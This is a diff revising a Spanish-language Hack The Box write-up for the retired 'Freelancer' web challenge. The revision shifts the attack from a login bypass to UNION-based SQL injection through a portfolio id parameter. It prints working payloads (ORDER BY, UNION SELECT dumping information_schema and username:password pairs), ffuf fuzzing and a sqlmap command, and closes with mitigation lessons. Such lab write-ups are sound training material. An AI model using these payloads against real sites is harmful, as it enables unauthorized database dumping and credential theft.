@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, sqli, login-bypass, union, database]
+tags: [web, sqli, union, mysql, admin-panel]
 ---
 
 # Freelancer — Hack The Box
@@ -15,66 +15,51 @@ tags: [web, sqli, login-bypass, union, database]
 
 ## TL;DR
 
-Plataforma de freelancers con login y buscador. El formulario de acceso monta la consulta por concatenación: **inyección SQL**. Bypass del login con `' OR 1=1-- -` y extracción de la flag con `UNION SELECT` sobre la tabla que la guarda.
+El punto de entrada **no es el login**: es `portfolio.php?id=1`, un parámetro `GET` concatenado en la consulta (MySQL). Con `UNION` de **tres columnas** se vuelca el esquema y se obtiene la credencial del administrador; el panel `/admin` aparece al hacer fuzzing de directorios y con ella se llega a la flag.
 
 ## Enunciado y superficie
 
-Login con usuario y contraseña y un buscador de proyectos tras autenticarse. Base de datos MySQL/MariaDB.
+Instancia Docker con una web de freelancers: portada, portfolios por `id` y un formulario de login. Sin código fuente; el análisis es de caja negra.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
-
-## Análisis del código
-
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
+```bash
+ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
+# portfolio.php, /admin
+curl -s "http://<IP>/portfolio.php?id=1"
+```
 
 ## Explicación del fallo
 
-Probar el bypass clásico en el usuario:
+Una comilla en `id` rompe la consulta (`id=1'` devuelve el portfolio vacío o el texto lorem desaparece): inyección clásica en un `SELECT` con **tres columnas**.
 
 ```text
-usuario:  ' OR 1=1-- -
-password: cualquiera
+id=1' ORDER BY 3-- -
+id=1' UNION SELECT 1,2,3-- -
+id=-1' UNION SELECT 1,version(),database()-- -
 ```
-
-Si entra, la consulta es del tipo:
-
-```sql
-SELECT * FROM users WHERE username = '$u' AND password = '$p'
-```
-
-Determinar el número de columnas:
 
 ```text
-' ORDER BY 1-- -
-' ORDER BY 2-- -
-...
+5.7.x | <base_de_datos>
 ```
-
-## Reproducción local
-
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
 
 ## Explotación
 
-Con el login saltado, el buscador es el punto de extracción:
+Se enumera el esquema y se extrae la tabla de usuarios:
 
 ```text
-' UNION SELECT 1,2,3-- -
+id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
+id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<tabla>'-- -
+id=-1' UNION SELECT 1,concat(username,0x3a,password),3 FROM <tabla>-- -
 ```
 
-Se colocan las columnas visibles y se enumeran esquema y tablas:
+La versión del reto es antigua y la contraseña se guarda en claro o con un hash trivial, así que se entra en `/admin` con lo obtenido. Automatizado:
 
-```text
-' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
-' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<tabla>'-- -
-' UNION SELECT 1,<columna>,3 FROM <tabla>-- -
+```bash
+sqlmap -u "http://<IP>/portfolio.php?id=1" --batch --dbs --privileges
 ```
 
-```text
-HTB{<flag>}
-```
+Los writeups públicos discrepan en el último paso: unos leen la flag directamente en el volcado de la base de datos y otros la recogen del panel `/admin` tras autenticarse. Ambas rutas salen del mismo `UNION`.
 
 ## Evidencia
 
@@ -83,14 +68,10 @@ HTB{<flag>}
 
 ## Lecciones aprendidas
 
-- **Comentario**: MySQL necesita `-- -` con espacio o `#`; sin él la consulta queda inválida.
-- **Comillas escapadas**: probar variantes con `"` o con `\'`.
-- **Columnas**: si `UNION` falla, ajustar el número con `ORDER BY` antes.
+- **Mirar el HTML antes del login**: el `href="portfolio.php?id=1"` es la pista que ahorra media hora.
+- **Columnas**: `ORDER BY` primero, `UNION SELECT 1,2,3` después.
+- **`-1` en el `id`**: sin él la fila legítima tapa el resultado de la inyección.
 
-- Un login vulnerable a SQLi entrega la base de datos entera, no solo el acceso.
-- `UNION` convierte cualquier campo reflejado en un canal de extracción.
-- Mitigación: consultas preparadas, usuario de BD con permisos mínimos y un WAF como capa extra.
-
-## Mitigaciones y detección
-
-- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
+- Un parámetro `GET` numérico es el sospechoso número uno de cualquier reto web.
+- `UNION` convierte cualquier columna reflejada en un canal de extracción.
+- Mitigación: consultas preparadas y permisos mínimos para la cuenta de base de datos.
